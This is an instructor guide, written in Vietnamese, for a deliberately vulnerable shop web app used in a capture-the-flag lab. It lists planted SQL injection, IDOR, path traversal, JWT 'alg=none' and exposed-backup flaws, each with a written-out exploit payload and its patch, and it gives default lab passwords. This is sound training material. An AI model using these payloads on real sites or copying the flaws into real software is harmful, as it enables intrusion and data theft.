# Hướng dẫn giảng viên · Meko Boutique

Tài liệu nội bộ: chứa câu chuyện nghiệp vụ, vị trí flag, cách khai thác và cách vá.
**Không phát kèm tài liệu thí sinh.**

## Mô hình flag

Mỗi đội có state riêng tại `/var/lib/meko-boutique/state.json`. Flag dạng `FLAG{32-hex}`, đổi sau
mỗi tick (mặc định 120 giây, cấu hình bằng `MEKO_TICK_SECONDS`). `secret`, `jwt_secret` và
`checker_key` giữ nguyên qua restart; tick không reset nếu `/var/lib/meko-boutique` còn nguyên.
Giao diện mua sắm thông thường không bao giờ hiển thị flag.

## Năm thử thách: câu chuyện, flag, khai thác, vá

| Nhóm | Câu chuyện nghiệp vụ | Flag đặt ở runtime | Khai thác trong lab | Bản vá |
|---|---|---|---|---|
| **SQLi** | Nhân viên marketing lọc **bộ sưu tập** theo tên trong `/collections/search`. | `collection_notes.secret` trong `shop.sqlite3` | `GET /collections/search?q=` với payload UNION trên chính truy vấn bộ sưu tập | `sqli=true`: dùng truy vấn tham số hóa (placeholder `?`) |
| **IDOR** | Khách xem **hóa đơn** đơn hàng của mình; số đơn đoán được (đơn giả lập `9001`). | `orders.memo` của đơn `9001` | Đăng nhập tài khoản bất kỳ, mở `/account/orders/9001/invoice` | `idor=true`: so `orders.user_id` với người đang đăng nhập, khác thì `403` |
| **Upload** | **Studio phối đồ** nhận manifest JSON, trường `preview_file` trỏ tới tệp xem trước. | `/var/lib/meko-boutique/simulation/private-lookbook.txt` | Đăng nhập, POST JSON có `preview_file=../private-lookbook.txt` tới `/outfits/new` | `upload=true`: chỉ cho resolve trong `simulation/designs` |
| **JWT** | Khu **hội viên** đọc hạng từ thẻ JWT trong cookie `meko_member`. | `state.json → flags.jwt`, hiện tại `/member/benefits` | Giữ cookie phiên đăng nhập; đặt cookie `meko_member` là JWT `alg=none`, `sub=<id tài khoản>`, `rank=c-nocturne` | `jwt=true`: chỉ chấp nhận HS256 có chữ ký hợp lệ |
| **Backup** | Bản đối soát vận hành bị xuất công khai qua HTTP (gợi ý trong `robots.txt`). | Nội dung phản hồi `/exports/operations.sql` | `GET /exports/operations.sql` | `backup=true`: gỡ export khỏi web (trả `404`) |

### Giới hạn vùng upload (quan trọng)

Mọi đường dẫn `preview_file` đều được `resolve()` và **bắt buộc** nằm dưới
`/var/lib/meko-boutique/simulation`. Payload vượt khỏi vùng này (ví dụ `../../../../etc/passwd`)
luôn bị từ chối `400`, **kể cả khi chưa vá**. Không có route đọc tệp tùy ý và không thực thi tệp
tải lên; lỗ hổng chỉ cho đọc trong dữ liệu giả lập, không chạm hệ thống host.

## Quy trình khai thác để tái hiện

1. **SQLi:** `GET /collections/search?q=zzz%' UNION SELECT 1, secret, '' FROM collection_notes --`
   — cột thứ hai hiển thị trong tiêu đề/nội dung bộ sưu tập, chứa flag.
2. **IDOR:** đăng ký/đăng nhập tài khoản A → mở `/account/orders/9001/invoice`; dòng
   "Ghi chú giao nhận" chứa flag (đơn thuộc khách giả lập, không phải A).
3. **Upload:** đăng nhập → upload JSON `{"name":"x","preview_file":"../private-lookbook.txt"}`
   tới `/outfits/new`; bản xem trước trả nội dung lookbook giả lập chứa flag.
4. **JWT:** giữ cookie phiên; tạo token:
   - header `{"alg":"none","typ":"JWT"}`, payload `{"sub":"<ID>","rank":"c-nocturne","exp":<tương lai>}`, chữ ký rỗng;
   - đặt vào cookie `meko_member` rồi mở `/member/benefits`.
5. **Backup:** `GET /exports/operations.sql`; flag nằm trong dòng `INSERT ... VALUES('ops-key','FLAG{...}')`.

Lấy `<ID tài khoản>` phục vụ JWT: sau khi đăng nhập, nó là `sub` trong cookie `meko_member` hiện
có (giải mã base64url phần payload), hoặc tra trong `shop.sqlite3`.

## Bật bản vá

Tạo `/var/lib/meko-boutique/patches.json` (owner `meko-web:meko-web`, mode `0600`) rồi restart:

```json
{"sqli": true, "idor": true, "upload": true, "jwt": true, "backup": true}
```

```bash
sudo install -o meko-web -g meko-web -m 0600 /dev/stdin /var/lib/meko-boutique/patches.json <<'EOF'
{"sqli": true, "idor": true, "upload": true, "jwt": true, "backup": true}
EOF
sudo systemctl restart meko-boutique
```

Local dev: đặt `patches.json` trong thư mục `MEKO_DATA`. `patches.json` được đọc lúc khởi tạo
tiến trình; cần restart sau khi sửa. Bản vá nằm ngoài source và bền vững qua đổi tick/restart.

## Checker và tích hợp chấm

- `sandbox/checker/check.py URL --key KEY --team team1` kiểm tra `/health` và danh tính đội.
- `--task TASK` đọc flag hiện hành; `--put FLAG` ghi flag qua `GET/PUT /api/checker/flag/<task>`.
- API yêu cầu header `X-Checker-Key`. Provisioning tạo khóa bền vững tại
  `/etc/meko-boutique/checker.env` (root, `0600`) — ngẫu nhiên nếu `meko_checker_key` để trống,
  hoặc dùng giá trị cấu hình. Lấy khóa qua SSH quản trị; **không** phát cho thí sinh.

Checker CLI/API là adapter cục bộ. Chưa tích hợp định dạng service-checker, SLA, scoring engine
hay token cấp flag của CyberRangeCZ/ForcAD; cần ánh xạ giao diện put/get của nền tảng trước khi
chấm tự động.

## Mật khẩu (cấu hình sẵn trong YAML)

- SSH/console tài khoản đội: `meko_team_passwords` trong `sandbox/provisioning/group_vars/all.yml`
  (mặc định `MekoTeam1@2026`, `MekoTeam2@2026`, `MekoTeam3@2026`).
- Mật khẩu nhân viên website (`/staff/login`): `meko_staff_password` (mặc định `MekoStaff@2026-ops`).
- Tài khoản `kali` mặc định của image **bị khóa** (`password_lock`, shell `nologin`).
- Đây là mật khẩu CHỈ DÙNG cho lab cô lập — đổi trước khi dùng ngoài cloud huấn luyện riêng.
